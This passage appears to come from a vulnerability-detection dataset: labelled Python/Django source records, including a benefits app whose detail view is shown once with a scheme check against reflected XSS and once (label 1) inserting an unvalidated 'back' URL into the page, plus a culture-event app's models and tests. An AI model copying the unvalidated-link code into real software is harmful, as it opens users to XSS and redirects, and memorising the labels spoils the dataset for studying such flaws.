question_ids\n        }\n\n        if data:\n            kwargs['data'] = data\n\n        return kwargs\n\n    def form_valid(self, form):\n        selected_flags = []\n\n        # Assemble query\n        for question in entry_form_config:\n            flag = form.cleaned_data.get(str(question['id']), False)\n\n            if flag:\n                selected_flags.append(getattr(BenefitRequirement.flags, build_question_flag(question)))\n\n        return self.render_to_response({\n            'form': form,\n            'submitted': True,\n            'claimable_benefits': Benefit.objects.find_claimable(selected_flags),\n        })\n\n\nclass BenefitDetailView(DetailView):\n    model = Benefit\n    template_name = 'core/benefit_detail.html'\n\n    def get_context_data(self, *args, **kwargs):\n        data = super().get_context_data(*args, **kwargs)\n\n        back = self.request.GET.get('back', None)\n        parsed_back_url = urllib.parse.urlparse(back)\n\n        # We only allow blank scheme, e.g. relative urls to avoid reflected XSS\n        if back is not None and parsed_back_url.scheme == \"\":\n            data['back_link'] = back\n\n        return data\n/n/n/n", "label": 0}, {"id": "1bd25d971ac3f9ac7ae3915cc2dd86b0ceb44b53", "code": "/socialsystem/core/views.py/n/nfrom django.views.generic import TemplateView, FormView, DetailView\nfrom django.urls import reverse\n\nfrom .entryform import EntryForm, entry_form_config, build_question_flag\nfrom .models import LifeCondition, Benefit, BenefitRequirement\n\n\nclass BenefitOverview(TemplateView):\n    template_name = 'core/benefit_overview.html'\n\n    def get_context_data(self):\n        data = super().get_context_data()\n        data['life_conditions'] = LifeCondition.objects.with_benefits()\n        return data\n\n\nclass BenefitClaimView(FormView):\n    template_name = 'core/benefit_claim.html'\n    form_class = EntryForm\n\n    def get(self, request, *args, **kwargs):\n        form = self.get_form()\n\n        if form.is_valid():\n            return self.form_valid(form)\n        else:\n            return self.render_to_response(self.get_context_data())\n\n    def get_form_kwargs(self, *args, **kwargs):\n        kwargs = super().get_form_kwargs()\n        kwargs['entry_form_config'] = entry_form_config\n\n        question_ids = {str(q['id']) for q in entry_form_config}\n        data = {\n            f'{item}': f'{value}' for item, value in self.request.GET.items() if item in question_ids\n        }\n\n        if data:\n            kwargs['data'] = data\n\n        return kwargs\n\n    def form_valid(self, form):\n        selected_flags = []\n\n        # Assemble query\n        for question in entry_form_config:\n            flag = form.cleaned_data.get(str(question['id']), False)\n\n            if flag:\n                selected_flags.append(getattr(BenefitRequirement.flags, build_question_flag(question)))\n\n        return self.render_to_response({\n            'form': form,\n            'submitted': True,\n            'claimable_benefits': Benefit.objects.find_claimable(selected_flags),\n        })\n\n\nclass BenefitDetailView(DetailView):\n    model = Benefit\n    template_name = 'core/benefit_detail.html'\n\n    def get_context_data(self, *args, **kwargs):\n        data = super().get_context_data(*args, **kwargs)\n\n        if self.request.GET.get('back', None) is not None:\n            data['back_link'] = self.request.GET['back']\n\n        return data\n/n/n/n", "label": 1}, {"id": "a06d85cd0b0964f8469e5c4bc9a6c132aa0b4c37", "code": "CE/models.py/n/nfrom django.db import models\nfrom django.utils.text import slugify\nfrom django.core.files.uploadedfile import InMemoryUploadedFile\nfrom PIL import Image\nfrom io import BytesIO\n\nimport CE.settings\nimport sys\nimport re\nimport bleach\n\nclass CultureEvent(models.Model):\n    title = models.CharField(max_length=60, blank=False, unique=True)\n    date_created = models.DateTimeField(auto_now_add=True)\n    last_modified = models.DateTimeField(auto_now=True)\n    last_modified_by = models.CharField(max_length=20)\n    # plain text description is what the user has entered. description is a processed version of the plain text\n    # that adds hyperlinks and is displayed escaped so the html generates\n    description = models.TextField(blank=True)\n    description_plain_text = models.TextField(blank=True)\n\n    differences = models.TextField(blank=True)\n    interpretation = models.TextField(blank=True)\n    slug = models.SlugField(unique=True) # set in save function, form doesn't need to validate it\n\n    def save(self):\n        # copy the user's input from plain text to description to be processed\n        # uses bleach to remove potentially harmful HTML code\n        self.description = bleach.clean(str(self.description_plain_text),\n                                        tags=CE.settings.bleach_allowed,\n                                        strip=True)\n        if CE.settings.auto_cross_reference:\n            self.auto_cross_ref()\n        else:\n            self.find_tag()\n        self.slug = slugify(self.title)\n        super().save()\n\n    def find_tag(self):\n        # todo case sensitive, shouldn't be\n        # find anything in the plain text description with {} around it and replace it with a hyperlink if valid\n        # only triggers if auto_cross_reference is False\n        tags = re.findall(r'{.+?}', self.description)\n        ce_slugs = self.list_slugs()\n        for tag in tags:\n            content = tag\n            content = content.strip('{')\n            content = content.strip('}')\n            for i, title_slug in enumerate(ce_slugs):\n                # if slug found within {} replace with hyperlink\n                if title_slug in slugify(content):\n                    title_deslug = title_slug.replace('-', ' ')\n                    slug_href = '<a href=\"' + title_slug + '\">' + title_deslug + '</a>'\n                    self.description = self.description.replace('{'+ title_deslug + '}', slug_href)\n                # if none of the title slugs are found remove the {}\n                elif i == len(ce_slugs) - 1:\n                    self.description = self.description.replace(tag, content)\n\n\n    def auto_cross_ref(self):\n        # todo Will miss cases where user uses a capital. Currently only works with lower case.\n        # search the plain text description for slugs and replace them with hyperlinks if found\n        # only triggers if auto_cross_reference is True\n        slugged_description = slugify(self.description_plain_text)\n        ce_slugs = self.list_slugs()\n        for title_slug in ce_slugs:\n            if title_slug in slugged_description:\n                title_deslug = title_slug.replace('-', ' ')\n                slug_href = '<a href=\"' + title_slug + '\">' + title_deslug + '</a>'\n                self.description = self.description.replace(title_deslug, slug_href)\n\n    def list_slugs(self):\n        ce_objects = CultureEvent.objects.all()\n        ce_slugs = [i.slug for i in ce_objects]\n        return ce_slugs\n\n    def __str__(self):\n        return str(self.title)\n\n\nclass ParticipationModel(models.Model):\n    ce = models.ForeignKey('CultureEvent', on_delete=models.CASCADE)\n    team_participants = models.CharField(blank=True, max_length=60)\n    national_participants = models.CharField(blank=True, max_length=60)\n    date = models.DateField(blank=False)\n\n    def __str__(self):\n        return str('Participants for ' + str(self.ce))\n\n\n# provide file folders to save audio and pictures in using foreign keys\ndef picture_folder(instance, filename):\n    return '/'.join(['CultureEventFiles', str(instance.ce.id), 'images', filename])\n\n\ndef audio_folder(instance, filename):\n    return '/'.join(['CultureEventFiles', str(instance.ce.id), 'audio', filename])\n\n\nclass PictureModel(models.Model):\n    ce = models.ForeignKey('CultureEvent', on_delete=models.CASCADE)\n    picture = models.ImageField(upload_to=picture_folder, blank=True)\n    # blank=True is a fudge. Trying to display multiple models in a single form and it wont'\n    # submit if there is validation. The view function makes sure blank entries aren't saved though\n\n    def __str__(self):\n        return 'Picture for ' + str(self.ce)\n\n    def save(self):\n        im = Image.open(self.picture)\n        output = BytesIO()\n        im = im.resize((1200, 900))\n        im.save(output, format='JPEG', quality=90)\n        output.seek(0)\n        self.picture = InMemoryUploadedFile(output, 'PictureField',\n                                            \"%s.jpg\" % self.picture.name.split('.')[0],\n                                            'image/jpeg',\n                                             sys.getsizeof(output), None)\n\n        super(PictureModel, self).save()\n\n\nclass TextModel(models.Model):\n    ce = models.ForeignKey('CultureEvent', on_delete=models.PROTECT)\n    audio = models.FileField(upload_to=audio_folder, blank=False)\n    phonetic_text = models.TextField(blank=True)\n    phonetic_standard = models.CharField(choices=[('1', 'Unchecked'),\n                                                  ('2', 'Double checked by author'),\n                                                  ('3', 'Checked by team mate'),\n                                                  ('4', 'Approved by whole team'),\n                                                  ('5', 'Valid for linguistic analysis')],\n                                         max_length=30,\n                                         blank=True)\n    orthographic_text = models.TextField(blank=True)\n    valid_for_DA = models.BooleanField()\n    discourse_type = models.CharField(choices=[('1', 'Narrative'),\n                                               ('2', 'Hortatory'),\n                                               ('3', 'Procedural'),\n                                               ('4', 'Expository'),\n                                               ('5', 'Descriptive')],\n                                      max_length=15,\n                                      blank=True)\n\n    def __str__(self):\n        return 'Text for ' + str(self.ce)\n\n\nclass QuestionModel(models.Model):\n    ce = models.ForeignKey('CultureEvent', on_delete=models.CASCADE)\n    question = models.CharField(max_length=200)\n    answer = models.CharField(max_length=200,\n                              blank=True)\n    date_created = models.DateTimeField(auto_now_add=True)\n    asked_by = models.CharField(max_length=30)\n    last_modified = models.DateTimeField(auto_now=True)\n    last_modified_by = models.CharField(max_length=20)\n    answered_by = models.CharField(max_length=20)\n\n    def __str__(self):\n        return 'Question about ' + str(self.ce) + ' CE'\n/n/n/nCE/settings.py/n/nculture_events_shown_on_home_page = 10\n# If auto_cross_reference = True program will scan description field for url slugs whenever that\n# CE is saved. If it finds a matching slug in the description it will add a hyperlink\n# If False hyperlinks will only be added to valid slugs within curly brackets {}\nauto_cross_reference = True\n# A list of allowed HTML tags the user can enter to HTML escaped fields.\nbleach_allowed = ['strong', 'p']/n/n/nCE/tests.py/n/nfrom django.test import TestCase\nfrom django.urls import reverse\nfrom django.db.utils import IntegrityError\nfrom django.contrib.auth.models import User\nfrom django.core.files.uploadedfile import SimpleUploadedFile\nfrom CE import models, settings, forms\n\nimport os\nimport time\n\n# A separate test class for each model or view\n# a seperate test method for each set of conditions you want to test\n# test methods that describe their function\n\n# view tests\nclass CEHomeViewTest(TestCase):\n    def setUp(self):\n        self.total_CEs = settings.culture_events_shown_on_home_page + 1\n        for i in range(self.total_CEs):\n            Ces = models.CultureEvent(title=('Example culture event ' + str(i)),\n                                      last_modified_by='Tester')\n            Ces.save()\n\n    def test_home_page_returns_correct_html(self):\n        # home page should show recently modified CEs\n        response = self.client.get(reverse('CE:home_page'))\n        self.assertEqual(response.status_code, 200)\n        self.assertContains(response, '<!doctype html>') # checks base template used\n        self.assertContains(response, 'CE Home')\n        self.assertTemplateUsed('CE/home.html')\n        # test CE's loaded\n        self.assertContains(response, 'Example culture event 2')\n        # test not more loaded than settings allow\n        self.assertNotContains(response, 'Example culture event ' + str(self.total_CEs))\n        self.assertContains(response, 'by Tester')\n\n\nclass TestViewPage(TestCase):\n    def setUp(self):\n        ce = models.CultureEvent(title='Example CE1',\n                                 description_plain_text='A culture event happened',\n                                 differences='Last time it was different')\n        ce.save()\n        text = models.TextModel(ce=models.CultureEvent.objects.get(pk=1),\n                            audio='musicFile.ogg',\n                            phonetic_text='fo\u1d58n\u025bt\u026aks',\n                            orthographic_text='orthographic',\n                            valid_for_DA=False)\n        text.save()\n\n    def test_view_page(self):\n        # should return Example CE 1 page\n        response = self.client.get(reverse('CE:view', args='1'))\n        self.assertEqual(response.status_code, 200)\n        self.assertTemplateUsed('CE/view_CE.html')\n        self.assertContains(response, 'Example CE1')\n        self.assertContains(response, 'fo\u1d58n\u025bt\u026aks')\n        self.assertContains(response, 'musicFile.ogg')\n\n    def test_404(self):\n        # test an out of range index\n        response = self.client.get(reverse('CE:view', args='2'))\n        self.assertEqual(response.status_code, 404)\n\n# class TestEditPage(TestCase):\n#     @classmethod\n#     def setUpClass(cls):\n#         super().setUpClass()\n#         credentials = User(username='Tester')\n#         credentials.set_password('secure_password')\n#         credentials.save()\n#\n#     def setUp(self):\n#         self.client.login(username='Tester', password='secure_password')\n#         ce = models.CultureEvent(title='Example CE1',\n#                                  description='A culture event happened',\n#                                  participation='Rhett did it',\n#                                  differences='Last time it was different')\n#         ce.save()\n#         # todo text model not used in tests\n#         text = models.TextModel(ce=models.CultureEvent.objects.get(pk=1),\n#                             audio='musicFile.ogg',\n#                             phonetic_text='fo\u1d58n\u025bt\u026aks',\n#                             orthographic_text='orthographic')\n#         text.save()\n#\n#     def test_edit_page_GET_response(self):\n#         # Form should populate with database data\n#         response = self.client.get(reverse('CE:edit', args='1'))\n#         self.assertEqual(response.status_code, 200)\n#         self.assertTemplateUsed('CE/edit_CE.html')\n#         html = response.content.decode('utf8')\n#         self.assertContains(response, '<form')\n#         # check form contents\n#         self.assertContains(response, 'value=\"Example CE1\"')\n#         self.assertContains(response, 'Rhett did it')\n#\n#     def test_valid_edit_page_POST_response_change_everything(self):\n#         # CE model should be updated, a new one shouldn't be created\n#         response = self.client.post(reverse('CE:edit', args='1'), {'title' : 'BAM',\n#                                                                    'participation' : 'minimal',\n#                                                                    'description' : 'pretty easy'},\n#                                     follow=True)\n#         self.assertTemplateUsed('CE/edit_CE.html')\n#         self.assertEqual(response.redirect_chain[0][1], 302, 'No redirect following POST')\n#         ce = models.CultureEvent.objects.get(pk=1)\n#         self.assertEqual(ce.title, 'BAM', 'edit not saved to db')\n#         self.assertFalse(ce.title == 'Example CE1', 'edit not saved to db')\n#         self.assertEqual(ce.last_modified_by, 'Tester', 'Last modified by not updated')\n#         self.assertEqual(response.status_code, 200, 'New page not shown')\n#         self.assertContains(response, 'BAM')\n#\n#     def test_valid_edit_page_POST_response_change_description_not_title(self):\n#         # CE model should be updated, a new one shouldn't be created\n#         response = self.client.post(reverse('CE:edit', args='1'), {'title' : 'Example CE1',\n#                                                                    'participation': 'minimal',\n#                                                                    'description': 'pretty easy'},\n#                                     follow=True)\n#         self.assertTemplateUsed('CE/edit_CE.html')\n#         self.assertEqual(response.redirect_chain[0][1], 302, 'No redirect following POST')\n#         ce = models.CultureEvent.objects.get(pk=1)\n#         self.assertEqual(ce.title, 'Example CE1', 'edit not saved to db')\n#         self.assertEqual(ce.description, 'pretty easy', 'edit not saved to db')\n#         self.assertEqual(response.status_code, 200, 'New page not shown')\n#         self.assertContains(response, 'Example CE1')\n#         self.assertEqual(ce.last_modified_by, 'Tester', 'Last modified by not updated')\n#\n#     def test_edit_page_no_changes(self):\n#         # no changes should go through, but .db unchanged\n#         ce = models.CultureEvent.objects.get(pk=1)\n#         response = self.client.post(reverse('CE:edit', args='1'), {'title': 'Example CE1',\n#                                                                    'participation': 'Rhett did it',\n#                                                                    'description': 'A culture event happened',\n#                                                                    'differences' : 'Last time it was different'},\n#                                     follow=True)\n#         new_ce = models.CultureEvent.objects.get(pk=1)\n#         self.assertEqual(response.redirect_chain[0][1], 302, 'No redirect following POST')\n#         self.assertEqual(ce, new_ce)\n#         self.assertEqual(ce.title, new_ce.title)\n#\n#     def test_edit_page_changing_to_existing_CE_title(self):\n#         # should reject changing to an existing title\n#         ce = models.CultureEvent(title='Example CE2',\n#                                  description='A culture event happened',\n#                                  participation='Rhett did it',\n#                                  differences='Last time it was different')\n#         ce.save()\n#         response = self.client.post(reverse('CE:edit', args='2'), {'title': 'Example CE1',\n#                                                                    'participation': 'Rhett did it',\n#                                                                    'description': 'A culture event happened',\n#                                                                    'differences': 'Last time it was different'},\n#                                     follow=True)\n#         self.assertContains(response, 'Culture event with this Title already exists')\n#         self.assertEqual(models.CultureEvent.objects.get(pk=2).title, 'Example CE2')\n#         self.assertEqual(models.CultureEvent.objects.get(pk=1).title, 'Example CE1')\n\n\nclass NewCEPageTest(TestCase):\n    @classmethod\n    def setUpClass(cls):\n        super().setUpClass()\n        credentials = User(username='Tester')\n        credentials.set_password('secure_password')\n        credentials.save()\n\n    def setUp(self):\n        self.client.login(username='Tester', password='secure_password')\n        # have one model previously in .db\n        ce = models.CultureEvent(title='Example CE1',\n                                 description_plain_text='A culture event happened',\n                                 differences='Last time it was different')\n        ce.save()\n        participants = models.ParticipationModel(date='2019-08-05',\n                                                 team_participants='Steve',\n                                                 national_participants='Ulumo',\n                                                 ce=ce)\n        participants.save()\n\n    def test_new_CE_page_GET_response(self):\n        # blank form should be returned\n        response = self.client.get(reverse('CE:new'))\n        self.assertEqual(response.status_code, 200)\n        self.assertTemplateUsed('CE/new_CE.html')\n        self.assertContains(response, 'Create a new CE')\n        self.assertContains(response, '<form')\n        self.assertContains(response, '<label for=\"id_title\">CE title:</label>')\n\n    def test_new_CE_Page_valid_POST_response(self):\n        # new CE should be created\n        response = self.client.post(reverse('CE:new'), {\n            'title': 'A test CE',\n            'description_plain_text' : 'I\\'m testing this CE',\n            'date': '2019-04-20',\n            'national_participants': 'Ulumo',\n            'team_participants': 'Rhett',\n            'text-TOTAL_FORMS': 0,\n            'text-INITIAL_FORMS': 0,\n            'question-TOTAL_FORMS': 0,\n            'question-INITIAL_FORMS': 0\n        }, follow=True)\n        self.assertTemplateUsed('CE/new_CE.html')\n        self.assertRedirects(response, '/CE/2')\n        ce = models.CultureEvent.objects.get(pk=2)\n        self.assertEqual(ce.title, 'A test CE', 'new CE title not correct')\n        self.assertEqual(ce.description_plain_text, 'I\\'m testing this CE', 'new CE description not correct')\n        self.assertEqual('A test CE', ce.title, 'New CE not in database')\n        self.assertEqual(response.status_code, 200, 'New page not shown')\n        self.assertContains(response, 'A test CE')\n        self.assertEqual(ce.last_modified_by, 'Tester', 'Last modified by not updated')\n        self.assertEqual(len(models.TextModel.objects.all()), 0, 'A blank Text was added')\n\n        response = self.client.get(reverse('CE:view', args='2'))\n        self.assertEqual(response.status_code, 200, 'New CE view page not displaying correctly')\n\n\n    def test_new_CE_page_invalid_POST_repeated_title_response(self):\n        # Form should be show again with error message\n        response = self.client.post(reverse('CE:new'), {\n            'Title': 'Example CE1',\n            'description_plain_text': 'I\\'m testing this CE',\n            'text-TOTAL_FORMS': 0,\n            'text-INITIAL_FORMS': 0,\n            'question-TOTAL_FORMS': 0,\n            'question-INITIAL_FORMS': 0\n        }, follow=True)\n        self.assertTemplateUsed('CE/new_CE.html')\n        #todo form error messages\n        # self.assertContains(response, 'Culture event with this Title already exists')\n        with self.assertRaises(models.CultureEvent.DoesNotExist):\n            models.CultureEvent.objects.get(pk=2)\n\n    def test_new_CE_page_invalid_POST_no_title_response(self):\n        # Form should be shown again with error message\n        # todo no validation shown\n        response = self.client.post(reverse('CE:new'), {\n            'description_plain_text': 'I\\'m testing this CE',\n            'text-TOTAL_FORMS': 0,\n            'text-INITIAL_FORMS': 0,\n            'question-TOTAL_FORMS': 0,\n            'question-INITIAL_FORMS': 0\n        }, follow=True)\n        self.assertTemplateUsed('CE/new_CE.html')\n        # self.assertContains(response, 'This field is required')\n        with self.assertRaises(models.CultureEvent.DoesNotExist):\n            models.CultureEvent.objects.get(pk=2)\n\n    def test_new_CE_page_saves_single_picture(self):\n        # todo refactor - probably as new class. Extensive set up and tear down neccesarry as uploads go into project dir\n        # clean up if existing test failed and left a file there\n        if os.path.exists('uploads/CultureEventFiles/2/images/test_pic1.jpg'):\n            os.remove('uploads/CultureEventFiles/2/images/test_pic1.jpg')\n        with open('CLAHub/static/test_data/test_pic1.JPG', 'rb') as file:\n            file = file.read()\n            test_image = SimpleUploadedFile('test_data/test_pic1.JPG', file, content_type='image')\n            response = self.client.post(reverse('CE:new'), {'title': 'Test CE',\n                                                            'date': '2019-03-20',\n                                                            'national_participants': 'Ulumo',\n                                                            'team_participants': 'Philip',\n                                                            'picture': test_image,\n                                                            'text-TOTAL_FORMS': 0,\n                                                            'text-INITIAL_FORMS': 0,\n                                                            'question-TOTAL_FORMS': 0,\n                                                            'question-INITIAL_FORMS': 0\n                                                            })\n        self.assertRedirects(response, '/CE/2')\n        new_ce = models.CultureEvent.objects.get(pk=2)\n        self.assertEqual('Test CE', new_ce.title, 'New CE not saved to db')\n        new_pic = models.PictureModel.objects.get(ce=new_ce)\n        self.assertEqual('CultureEventFiles/2/images/test_pic1.jpg',\n                         str(new_pic.picture), 'New CE not saved to db')\n\n        self.assertTrue(os.path.exists('uploads/CultureEventFiles/2/images'), 'upload folder doesn\\'t exist')\n        folder_contents = os.listdir('uploads/CultureEventFiles/2/images')\n        self.assertIn('test_pic1.jpg', folder_contents, 'Uploaded picture not in upload folder')\n        # check smaller than 1Mb\n        self.assertTrue(os.path.getsize('uploads/CultureEventFiles/2/images/test_pic1.jpg') < 1000000, 'picture too big')\n        # check Foreign key is correct\n        self.assertEqual(new_ce, new_pic.ce, 'Foreign key not correct')\n\n        # check image displayed on view page\n        response = self.client.get(reverse('CE:view', args='2'))\n        self.assertContains(response, 'Test CE')\n        self.assertContains(response, '<div id=\"carouselExampleIndicators\"')\n        self.assertContains(response, '<img src=\"/uploads/CultureEventFiles/2/images/test_pic1.jpg')\n\n        # clean up after test - test uploads go onto actual file system program uses\n        if len(folder_contents) == 1:\n            # no user pictures, folder was created for test\n            os.remove('uploads/CultureEventFiles/2/images/test_pic1.jpg')\n            os.removedirs('uploads/CultureEventFiles/2/images')\n        elif len(folder_contents) > 1:\n            # users have uploaded pictures themselves\n            os.remove('uploads/CultureEventFiles/2/images/test_pic1.jpg')\n\n    def test_new_CE_page_can_save_text_and_audio(self):\n        # clean up if existing test failed and left a file there\n        if os.path.exists('uploads/CultureEventFiles/2/audio/test_audio1.mp3'):\n            os.remove('uploads/CultureEventFiles/2/audio/test_audio1.mp3')\n        test_phonetics = 'f\u028cni fo\u1d58n\u025bt\u026ak s\u026amb\u0254lz \u014b t\u0283 \u0292'\n        test_orthography = 'orthography'\n        with open('CLAHub/static/test_data/test_audio1.mp3', 'rb') as file:\n            file = file.read()\n            test_audio = SimpleUploadedFile('test_data/test_audio1.mp3', file, content_type='audio')\n            response = self.client.post(reverse('CE:new'), {'title': 'Test CE',\n                                                            'date': '2019-03-20',\n                                                            'national_participants': 'Ulumo',\n                                                            'team_participants': 'Philip',\n                                                            'text-0-phonetic_text': test_phonetics,\n                                                            'text-0-orthographic_text': test_orthography,\n                                                            'text-0-phonetic_standard': '1',\n                                                            'text-0-audio': test_audio,\n                                                            'text-0-valid_for_DA': False,\n                                                            'text-0-discourse_type': '',\n                                                            'text-TOTAL_FORMS': 1,\n                                                            'text-INITIAL_FORMS': 0,\n                                                            'question-TOTAL_FORMS': 0,\n                                                            'question-INITIAL_FORMS': 0\n                                                            })\n        self.assertRedirects(response, '/CE/2')\n        new_ce = models.CultureEvent.objects.get(pk=2)\n        self.assertEqual('Test CE', new_ce.title, 'New CE not saved to db')\n        new_text = models.TextModel.objects.get(ce=new_ce)\n        self.assertEqual('CultureEventFiles/2/audio/test_audio1.mp3',\n                         str(new_text.audio), 'New text not saved to db')\n\n        self.assertTrue(os.path.exists('uploads/CultureEventFiles/2/audio'), 'upload folder doesn\\'t exist')\n        folder_contents = os.listdir('uploads/CultureEventFiles/2/audio')\n        self.assertIn('test_audio1.mp3', folder_contents, 'Uploaded audio not in upload folder')\n        # check Foreign key is correct\n        self.assertEqual(new_ce, new_text.ce, 'Foreign key not correct')\n        self.assertEqual(test_phonetics, new_text.phonetic_text, 'Phonetics not correct')\n        self.assertEqual(test_orthography, new_text.orthographic_text, 'Orthography not correct')\n\n        # check audio displayed on view page\n        response = self.client.get(reverse('CE:view', args='2'))\n        self.assertContains(response, 'Test CE')\n        self.assertContains(response,\n                            '<audio controls> <source src=\"/uploads/CultureEventFiles/2/audio/test_audio1.mp3\"></audio>')\n        # clean up after test - test uploads go onto actual file system program uses\n        if len(folder_contents) == 1:\n            # no user audio, folder was created for test\n            os.remove('uploads/CultureEventFiles/2/audio/test_audio1.mp3')\n            os.removedirs('uploads/CultureEventFiles/2/audio')\n        elif len(folder_contents) > 1:\n            # users have uploaded pictures themselves\n            os.remove('uploads/CultureEventFiles/2/audio/test_audio1.mp3')\n\n    def test_single_question_submit(self):\n        question = 'Does this work?'\n        answer = 'I hope so!'\n        response = self.client.post(reverse('CE:new'), {'title': 'Test CE',\n                                                            'date': '2019-03-20',\n                                                            'national_participants': 'Ulumo',\n                                                            'team_participants': 'Philip',\n                                                            'text-TOTAL_FORMS': 0,\n                                                            'text-INITIAL_FORMS': 0,\n                                                            'question-TOTAL_FORMS': 1,\n                                                            'question-INITIAL_FORMS': 0,\n                                                            'question-0-question': question,\n                                                            'question-0-answer': answer\n                                                            })\n        self.assertRedirects(response, '/CE/2')\n        q = models.QuestionModel.objects.all()\n        self.assertEqual(len(q), 1)\n        self.assertEqual(q[0].question, question)\n        self.assertEqual(q[0].answer, answer)\n        self.assertEqual(q[0].asked_by, 'Tester')\n        self.assertEqual(q[0].last_modified_by, 'Tester')\n\n    def test_incomplete_question_sumbit(self):\n        question = 'Does this work?'\n        response = self.client.post(reverse('CE:new'), {'title': 'Test CE',\n                                                        'date': '2019-03-20',\n                                                        'national_participants': 'Ulumo',\n                                                        'team_participants': 'Philip',\n                                                        'text-TOTAL_FORMS': 0,\n                                                        'text-INITIAL_FORMS': 0,\n                                                        'question-TOTAL_FORMS': 1,\n                                                        'question-INITIAL_FORMS': 0,\n                                                        'question-0-question': question,\n                                                        })\n        self.assertRedirects(response, '/CE/2')\n        q = models.QuestionModel.objects.all()\n        self.assertEqual(len(q), 1)\n        self.assertEqual(q[0].question, question)\n        self.assertEqual(q[0].answer, '')\n        self.assertEqual(q[0].asked_by, 'Tester')\n        self.assertEqual(q[0].last_modified_by, 'Tester')\n\n    def test_multiple_question_submit(self):\n        question = 'Does this work?'\n        answer = 'I hope so!'\n        response = self.client.post(reverse('CE:new'), {'title': 'Test CE',\n                                                        'date': '2019-03-20',\n                                                        'national_participants': 'Ulumo',\n                                                        'team_participants': 'Philip',\n                                                        'text-TOTAL_FORMS': 0,\n                                                        'text-INITIAL_FORMS': 0,\n                                                        'question-TOTAL_FORMS': 40,\n                                                        # todo blank forms are being added by JS\n                                                        'question-INITIAL_FORMS': 0,\n                                                        'question-0-question': question,\n                                                        'question-0-answer': answer,\n                                                        'question-2-question': question,\n                                                        'question-2-answer': answer,\n                                                        'question-4-question': question,\n                                                        'question-4-answer': answer\n                                                        })\n        self.assertRedirects(response, '/CE/2')\n        q = models.QuestionModel.objects.all()\n        self.assertEqual(len(q), 3)\n        for thing in q:\n            self.assertEqual(thing.question, question)\n            self.assertEqual(thing.answer, answer)\n            self.assertEqual(thing.asked_by, 'Tester')\n            self.assertEqual(thing.last_modified_by, 'Tester')\n\n    def blank_questions_submitted(self):\n        response = self.client.post(reverse('CE:new'), {'title': 'Test CE',\n                                                        'date': '2019-03-20',\n                                                        'national_participants': 'Ulumo',\n                                                        'team_participants': 'Philip',\n                                                        'text-TOTAL_FORMS': 0,\n                                                        'text-INITIAL_FORMS': 0,\n                                                        'question-TOTAL_FORMS': 10,\n                                                        'question-INITIAL_FORMS': 0,\n                                                        })\n        self.assertRedirects(response, '/CE/2')\n        q = models.QuestionModel.objects.all()\n        self.assertEqual(len(q), 0)\n\n\nclass UnloggedUserRedirect(TestCase):\n    def test_redirected_from_edit_CE_page(self):\n        response = self.client.get(reverse('CE:edit', args='1'), follow=True)\n        self.assertTemplateUsed('CE/edit.html')\n        self.assertEqual(response.redirect_chain[0][1], 302)\n        self.assertEqual(response.status_code, 200,\n                         'Unlogged User not redirected from edit CE page')\n        self.assertRedirects(response, '/accounts/login/?next=/CE/1/edit')\n\n    def test_redirected_from_new_CE_page(self):\n        response = self.client.get(reverse('CE:new'), follow=True)\n        self.assertTemplateUsed('CE/edit.html')\n        self.assertEqual(response.redirect_chain[0][1], 302)\n        self.assertEqual(response.status_code, 200,\n                         'Unlogged User not redirected from edit CE page')\n        self.assertRedirects(response, '/accounts/login/?next=/CE/new')\n\n\nclass QuestionPageTest(TestCase):\n    @classmethod\n    def setUpClass(cls):\n        super().setUpClass()\n        credentials = User(username='Tester')\n        credentials.set_password('secure_password')\n        credentials.save()\n\n    def setUp(self):\n        self.client.login(username='Tester', password='secure_password')\n        # have one model previously in .db\n        ce = models.CultureEvent(title='An Example CE1',\n                                 description_plain_text='A culture event happened',\n                                 differences='Last time it was different')\n        ce.save()\n        participants = models.ParticipationModel(date='2019-08-05',\n                                                 team_participants='Steve',\n                                                 national_participants='Ulumo',\n                                                 ce=ce)\n        participants.save()\n        questions = models.QuestionModel(question='First question',\n                                         answer='First answer',\n                                         asked_by='Tester',\n                                         ce=ce)\n        questions.save()\n        time.sleep(0.1)\n        ce = models.CultureEvent(title='Cats like Example CE2',\n                                 description_plain_text='A culture event happened again',\n                                 differences='Last time it was different')\n        ce.save()\n        questions = models.QuestionModel(question='Second question',\n                                         asked_by='Tester',\n                                         ce=ce)\n        questions.save()\n        participants = models.ParticipationModel(date='2019-08-06',\n                                                 team_participants='Rhett',\n                                                 national_participants='Ulumo',\n                                                 ce=ce)\n        participants.save()\n        time.sleep(0.1)\n\n        ce = models.CultureEvent(title='because I can Example CE3',\n                                 description_plain_text='A culture event happened a third time',\n                                 differences='Last time it was different')\n        ce.save()\n        questions = models.QuestionModel(question='Third question',\n                                         asked_by='Tester',\n                                         ce=ce)\n        questions.save()\n        time.sleep(0.1)\n        questions = models.QuestionModel(question='Fourth question',\n                                         asked_by='Tester',\n                                         ce=ce)\n        questions.save()\n        participants = models.ParticipationModel(date='2019-08-07',\n                                                 team_participants='Philip',\n                                                 national_participants='Ulumo',\n                                                 ce=ce)\n        participants.save()\n\n\n    def test_chron_question_page(self):\n        response = self.client.get(reverse('CE:questions_chron'))\n        self.assertEqual(response.status_code, 200)\n        self.assertTemplateUsed('CE/questions_chron.html')\n        self.assertContains(response, 'First question')\n        # get a ordered list from .db and then check slice position of each question\n        q = models.QuestionModel.objects.all().order_by('-date_created')\n        # check that questions were uploaded in the right order on class initialisation\n        self.assertEqual(q[0].question, 'Fourth question', 'Test data not in correct order')\n        self.assertEqual(q[1].question, 'Third question', 'Test data not in correct order')\n        self.assertEqual(q[2].question, 'Second question', 'Test data not in correct order')\n        self.assertEqual(q[3].question, 'First question', 'Test data not in correct order')\n        html = response.content.decode('utf8')\n        q1_pos = html.find(q[0].question)\n        q2_pos = html.find(q[1].question)\n        q3_pos = html.find(q[2].question)\n        q4_pos = html.find(q[3].question)\n        self.assertGreater(q2_pos, q1_pos)\n        self.assertGreater(q3_pos, q2_pos)\n        self.assertGreater(q4_pos, q3_pos)\n\n    def test_alphabetical_question_page(self):\n        response = self.client.get(reverse('CE:questions_alph'))\n        self.assertEqual(response.status_code, 200)\n        self.assertTemplateUsed('CE/questions_alph.html')\n        self.assertContains(response, 'An Example CE1')\n        self.assertContains(response, 'because I can Example CE3')\n        # get a ordered list from .db and then check slice position of each question\n        q = models.QuestionModel.objects.all()\n        self.assertEqual(len(q), 4, 'Wrong number of questions')\n        set_ces = set([i.ce for i in q])\n        set_ces = sorted(set_ces, key=lambda x: x.title.lower())\n        self.assertEqual(len(set_ces), 3, 'Wrong number of unique CEs')\n        # check that questions were uploaded in the right order on class initialisation\n        self.assertEqual(set_ces[0].title, 'An Example CE1', 'Test data not in correct order')\n        